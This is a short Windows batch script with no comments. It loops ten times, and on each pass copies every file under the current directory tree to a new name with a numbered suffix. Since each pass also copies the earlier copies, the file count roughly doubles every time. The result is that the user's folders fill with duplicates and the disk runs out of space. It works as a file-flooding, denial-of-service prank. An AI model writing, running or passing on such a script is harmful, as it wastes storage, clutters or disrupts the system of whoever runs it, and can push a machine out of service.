@echo off
for /l %%x in (1,1,10) do (
	for /f "tokens=* delims=" %%a in ('dir %cd% /s /b') do (
		copy %%a %%a_%%x
		)
	)